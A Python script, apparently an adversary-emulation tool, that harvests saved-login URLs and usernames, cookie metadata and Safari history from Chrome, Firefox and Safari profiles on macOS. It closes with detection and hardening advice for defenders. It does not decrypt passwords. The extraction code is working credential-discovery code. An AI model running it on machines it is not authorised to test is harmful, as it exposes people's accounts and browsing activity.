#!/usr/bin/env python3
"""
Browser Credential Extractor — The Eden's Sins
MITRE ATT&CK: T1555.003 Credentials from Web Browsers

Extracts saved credentials and cookies from:
- Safari (keychain-backed)
- Chrome (Login Data SQLite + cookies)
- Firefox (logins.json + cookies.sqlite)

Usage:
    python3 browser_creds.py --browser all --metadata
    python3 browser_creds.py --browser chrome --cookies
    python3 browser_creds.py --detect
"""

import argparse
import json
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field, asdict
from pathlib import Path


@dataclass
class BrowserCred:
    browser: str
    url: str = ""
    username: str = ""
    has_password: bool = False
    created: str = ""

@dataclass
class BrowserCookie:
    browser: str
    domain: str = ""
    name: str = ""
    is_secure: bool = False
    is_httponly: bool = False
    expires: str = ""


# ─── Chrome ───
CHROME_PROFILES = [
    Path.home() / "Library/Application Support/Google/Chrome",
    Path.home() / "Library/Application Support/Google/Chrome Canary",
    Path.home() / "Library/Application Support/Chromium",
    Path.home() / "Library/Application Support/BraveSoftware/Brave-Browser",
    Path.home() / "Library/Application Support/Microsoft Edge",
]

def extract_chrome_logins(profile_dir: Path) -> list[BrowserCred]:
    """Extract saved logins from Chrome's Login Data SQLite db."""
    creds = []
    login_db = profile_dir / "Default" / "Login Data"

    if not login_db.exists():
        # Try other profile dirs
        for p in profile_dir.glob("*/Login Data"):
            login_db = p
            break

    if not login_db.exists():
        return creds

    # Copy to avoid lock conflicts
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
        tmp_path = tmp.name
    try:
        shutil.copy2(str(login_db), tmp_path)
        conn = sqlite3.connect(tmp_path)
        cursor = conn.cursor()

        cursor.execute("""
            SELECT origin_url, username_value, length(password_value) > 0,
                   date_created
            FROM logins
            ORDER BY date_created DESC
        """)

        browser_name = profile_dir.name
        for row in cursor.fetchall():
            creds.append(BrowserCred(
                browser=browser_name,
                url=row[0],
                username=row[1],
                has_password=bool(row[2]),
                created=str(row[3]),
            ))
        conn.close()
    except Exception as e:
        print(f"  [!] Chrome login read error: {e}")
    finally:
        os.unlink(tmp_path)

    return creds


def extract_chrome_cookies(profile_dir: Path) -> list[BrowserCookie]:
    """Extract cookies from Chrome."""
    cookies = []
    cookie_db = profile_dir / "Default" / "Cookies"

    if not cookie_db.exists():
        for p in profile_dir.glob("*/Cookies"):
            cookie_db = p
            break

    if not cookie_db.exists():
        return cookies

    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
        tmp_path = tmp.name
    try:
        shutil.copy2(str(cookie_db), tmp_path)
        conn = sqlite3.connect(tmp_path)
        cursor = conn.cursor()

        cursor.execute("""
            SELECT host_key, name, is_secure, is_httponly, expires_utc
            FROM cookies
            ORDER BY host_key
            LIMIT 200
        """)

        for row in cursor.fetchall():
            cookies.append(BrowserCookie(
                browser=profile_dir.name,
                domain=row[0],
                name=row[1],
                is_secure=bool(row[2]),
                is_httponly=bool(row[3]),
                expires=str(row[4]),
            ))
        conn.close()
    except Exception as e:
        print(f"  [!] Chrome cookie read error: {e}")
    finally:
        os.unlink(tmp_path)

    return cookies


# ─── Firefox ───
FIREFOX_DIR = Path.home() / "Library/Application Support/Firefox/Profiles"

def extract_firefox_logins() -> list[BrowserCred]:
    """Extract saved logins from Firefox logins.json."""
    creds = []
    if not FIREFOX_DIR.exists():
        return creds

    for profile in FIREFOX_DIR.iterdir():
        logins_file = profile / "logins.json"
        if not logins_file.exists():
            continue

        try:
            data = json.loads(logins_file.read_text())
            for login in data.get("logins", []):
                creds.append(BrowserCred(
                    browser="Firefox",
                    url=login.get("hostname", ""),
                    username=login.get("encryptedUsername", "")[:20] + "...[encrypted]",
                    has_password=bool(login.get("encryptedPassword")),
                    created=str(login.get("timeCreated", "")),
                ))
        except Exception as e:
            print(f"  [!] Firefox login parse error: {e}")

    return creds


def extract_firefox_cookies() -> list[BrowserCookie]:
    """Extract cookies from Firefox cookies.sqlite."""
    cookies = []
    if not FIREFOX_DIR.exists():
        return cookies

    for profile in FIREFOX_DIR.iterdir():
        cookie_db = profile / "cookies.sqlite"
        if not cookie_db.exists():
            continue

        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
            tmp_path = tmp.name
        try:
            shutil.copy2(str(cookie_db), tmp_path)
            conn = sqlite3.connect(tmp_path)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT host, name, isSecure, isHttpOnly, expiry
                FROM moz_cookies ORDER BY host LIMIT 200
            """)
            for row in cursor.fetchall():
                cookies.append(BrowserCookie(
                    browser="Firefox", domain=row[0], name=row[1],
                    is_secure=bool(row[2]), is_httponly=bool(row[3]),
                    expires=str(row[4]),
                ))
            conn.close()
        except Exception:
            pass
        finally:
            os.unlink(tmp_path)

    return cookies


# ─── Safari ───
def extract_safari_history() -> list[dict]:
    """Extract Safari browsing history (metadata only)."""
    entries = []
    history_db = Path.home() / "Library/Safari/History.db"
    if not history_db.exists():
        return entries

    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
        tmp_path = tmp.name
    try:
        shutil.copy2(str(history_db), tmp_path)
        conn = sqlite3.connect(tmp_path)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT url, title, visit_count
            FROM history_items
            ORDER BY visit_count DESC
            LIMIT 50
        """)
        for row in cursor.fetchall():
            entries.append({"url": row[0], "title": row[1] or "", "visits": row[2]})
        conn.close()
    except Exception as e:
        print(f"  [!] Safari history error: {e}")
    finally:
        os.unlink(tmp_path)

    return entries


def format_report(creds, cookies, history):
    """Format text report."""
    lines = [
        "=" * 60,
        "  THE EDEN'S SINS — Browser Credential Report",
        "=" * 60, "",
    ]

    if creds:
        lines.append(f"  📋 Saved Logins: {len(creds)}")
        lines.append("  " + "─" * 56)
        for c in creds[:30]:
            pw_icon = "🔑" if c.has_password else "·"
            lines.append(f"    {pw_icon} [{c.browser}] {c.url[:50]}")
            if c.username:
                lines.append(f"        User: {c.username}")

    if cookies:
        # Summarize by domain
        domains = {}
        for ck in cookies:
            domains.setdefault(ck.domain, 0)
            domains[ck.domain] += 1

        lines.extend(["", f"  🍪 Cookies: {len(cookies)} across {len(domains)} domains"])
        lines.append("  " + "─" * 56)
        for domain, count in sorted(domains.items(), key=lambda x: -x[1])[:20]:
            lines.append(f"    {count:4d}  {domain}")

    if history:
        lines.extend(["", f"  🌐 Safari History (top {len(history)} by visits):"])
        lines.append("  " + "─" * 56)
        for h in history[:15]:
            lines.append(f"    {h['visits']:4d}x  {h['url'][:60]}")

    lines.extend([
        "", "─" * 60,
        "  BLUE TEAM — Detection & Hardening",
        "─" * 60, "",
        "  Detection:",
        "    • Monitor SQLite reads on Login Data, Cookies, History.db",
        "    • Alert on `security find-internet-password` commands",
        "    • Track file copies from browser profile directories",
        "    • ESF: ES_EVENT_TYPE_NOTIFY_OPEN on browser data files", "",
        "  Hardening:",
        "    • Use browser master password (Firefox)",
        "    • Enable Chrome's on-device encryption for passwords",
        "    • Restrict browser profile directory permissions",
        "    • Use hardware security keys instead of saved passwords",
        "    • Clear sensitive cookies on browser exit",
        "=" * 60,
    ])

    return "\n".join(lines)


def detect_guide():
    print("""
  BLUE TEAM — Browser Credential Theft Detection
  ═══════════════════════════════════════════════
  Monitor:
    • File reads on ~/Library/Application Support/Google/Chrome/*/Login Data
    • File reads on ~/Library/Application Support/Firefox/Profiles/*/logins.json
    • File reads on ~/Library/Safari/History.db
    • Process `security find-internet-password` execution
    • SQLite operations on browser databases from non-browser processes

  Hardening:
    • Firefox: set master password
    • Chrome: enable on-device encryption (chrome://settings/passwords)
    • Safari: passwords protected by keychain + biometric
    • Use password manager (1Password/Bitwarden) instead of browser storage
    • TCC: Full Disk Access controls browser data access on Sonoma+
    """)


def main():
    p = argparse.ArgumentParser(description="Browser Creds — The Eden's Sins")
    p.add_argument("--browser", choices=["chrome", "firefox", "safari", "all"], default="all")
    p.add_argument("--metadata", action="store_true", help="Metadata only")
    p.add_argument("--cookies", action="store_true", help="Include cookies")
    p.add_argument("--json", action="store_true")
    p.add_argument("--detect", action="store_true")
    p.add_argument("--output", help="Save to file")
    args = p.parse_args()

    if args.detect:
        detect_guide()
        return

    creds, cookies, history = [], [], []
    browsers = [args.browser] if args.browser != "all" else ["chrome", "firefox", "safari"]

    for browser in browsers:
        if browser == "chrome":
            for profile in CHROME_PROFILES:
                if profile.exists():
                    creds.extend(extract_chrome_logins(profile))
                    if args.cookies:
                        cookies.extend(extract_chrome_cookies(profile))
        elif browser == "firefox":
            creds.extend(extract_firefox_logins())
            if args.cookies:
                cookies.extend(extract_firefox_cookies())
        elif browser == "safari":
            history.extend(extract_safari_history())

    if args.json:
        out = json.dumps({
            "creds": [asdict(c) for c in creds],
            "cookies": [asdict(c) for c in cookies],
            "history": history,
        }, indent=2)
    else:
        out = format_report(creds, cookies, history)

    print(out)
    if args.output:
        Path(args.output).write_text(out)
        print(f"\n[+] Saved to {args.output}")


if __name__ == "__main__":
    main()
